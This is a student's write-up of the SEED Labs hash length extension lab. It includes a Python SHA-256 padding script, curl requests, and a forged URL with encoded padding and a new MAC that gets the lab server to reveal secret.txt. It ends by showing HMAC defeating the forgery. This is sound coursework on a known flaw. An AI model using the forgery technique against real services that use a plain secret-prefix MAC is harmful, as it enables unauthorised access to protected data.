# 实验3：Hash长度扩展攻击

## assignment 1

**任务要求**：发送一个`download`命令到服务区，myname 的信息修改为你自己的姓名拼音，并且记录你得到的响应内容

- 查询`uid`对应的`key`值

```shell
cat key.txt | grep 1002
# 1002:983abe
```

- 计算`MAC`

```shell
echo -n "983abe:myname=LiJianhang&uid=1002&lstcmd=1&download=secret.txt" | sha256sum
# fc8a23a478045538ee9d4a0227ef9cd7532be5f7ae053ff387264aa499c41e3a  -
```

- 连接可以得到`URL`

> http://www.seedlab-hashlen.com/?myname=LiJianhang&uid=1002&lstcmd=1&download=secret.txt&mac=fc8a23a478045538ee9d4a0227ef9cd7532be5f7ae053ff387264aa499c41e3a

- 通过`GET`进行请求

```shell
curl "http://www.seedlab-hashlen.com/?myname=LiJianhang&uid=1002&lstcmd=1&download=secret.txt&mac=fc8a23a478045538ee9d4a0227ef9cd7532be5f7ae053ff387264aa499c41e3a"
```

- 得到以下结果

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Length Extension Lab</title>
</head>
<body>
    <nav class="navbar fixed-top navbar-light" style="background-color: #3EA055;">
        <a class="navbar-brand" href="#" >
            SEEDLabs
        </a>
    </nav>
    <div style="padding-top: 50px; text-align: center;">
        <h2><b>Hash Length Extension Attack Lab</b></h2>
        <div style="max-width: 35%; text-align: center; margin: auto;">    
                <b>Yes, your MAC is valid</b>      
                    <h3>List Directory</h3>
                    <ol>               
                            <li>secret.txt</li>               
                            <li>key.txt</li>            
                    </ol>   
                    <h3>File Content</h3>            
                        <p>TOP SECRET.</p>               
                        <p>DO NOT DISCLOSE.</p>               
                        <p></p>
        </div>
    </div>
</body>

```

## assignment 2

- 修改compute_padding.py，得到：

```python
key = "983abe" 
cmd = "myname=LiJianhang&uid=1002&lstcmd=1&download=secret.txt" 
message = key + ":" + cmd

padding_size = 64 - int(len(message) % 64)
if padding_size <= 8:
    padding_size += 64
padding = bytearray(0x00 for i in range(padding_size))
padding[0:1] = b'\x80'
padding[-8:] = (len(message)*8).to_bytes(8,byteorder='big')

# URL encode the padding (put a "%" in front each hex number)
padding_URL_encoded = ''
for i in range(padding_size):
    padding_URL_encoded += "%" + '{:02x}'.format(padding[i])
print(message + padding_URL_encoded)
```

- 执行

```shell
python compute_padding.py
# 983abe:myname=LiJianhang&uid=1002&lstcmd=1&download=secret.txt%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%01%f0
```



## assignment 3

- 构造请求(同`assignment 1`)

> http://www.seedlab-hashlen.com/?myname=lab3&uid=1003&lstcmd=1&mac=6555184e7dd7adffa52175e03277079ddd2baeddd0b09a5f927ada74ae79f3bf

- 新构造的请求，只差 `<new-mac>`

> http://www.seedlab-hashlen.com/?myname=lab3&uid=1003&lstcmd=1%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%01%20&download=secret.txt&mac=<new-mac>

- 编译 `url_length_extension.c`

```shell
gcc url_length_extension.c -o url_length_extension -lssl -lcrypto
```

- 计算出`<new-mac>`，更新请求

> http://www.seedlab-hashlen.com/?myname=lab3&uid=1003&lstcmd=1%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%01%20&download=secret.txt&mac=db68f50c8169189ff04343b5a64a24a1ab69b0f6468304208ef15e134b9b7fd6

- 使用`GET`请求，得到

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Length Extension Lab</title>
</head>
<body>
    <nav class="navbar fixed-top navbar-light" style="background-color: #3EA055;">
        <a class="navbar-brand" href="#" >
            SEEDLabs
        </a>
    </nav>

    <div style="padding-top: 50px; text-align: center;">
        <h2><b>Hash Length Extension Attack Lab</b></h2>
        <div style="max-width: 35%; text-align: center; margin: auto;">
            
                <b>Yes, your MAC is valid</b>
                

                
                    <h3>File Content</h3>
                    
                        <p>TOP SECRET.</p>
                    
                        <p>DO NOT DISCLOSE.</p>
                    
                        <p></p>
                    
                
            
        </div>
    </div>
</body>

```

## assignment 4

- 修改`lab.py`
- 使用先前长度扩展的`URL`

> http://www.seedlab-hashlen.com/?myname=lab3&uid=1003&lstcmd=1%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%01%20&download=secret.txt&mac=db68f50c8169189ff04343b5a64a24a1ab69b0f6468304208ef15e134b9b7fd6

- 发送`GET`请求，得到：

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Length Extension Lab</title>
</head>
<body>
    <nav class="navbar fixed-top navbar-light" style="background-color: #3EA055;">
        <a class="navbar-brand" href="#" >
            SEEDLabs
        </a>
    </nav>

    <div style="padding-top: 50px; text-align: center;">
        <h2><b>Hash Length Extension Attack Lab</b></h2>
        <div style="max-width: 35%; text-align: center; margin: auto;">
            
                <b>Sorry, your MAC is not valid</b>
            
        </div>
    </div>
</body>
```

- 显然失败

**解释原因：**

- 使用HMAC后，MAC的计算包括密钥的完整性检查，确保无法通过简单的长度扩展攻击伪造MAC。
- 由于HMAC使用密钥和消息的组合生成唯一MAC，任何对消息的改动都会导致MAC不匹配。
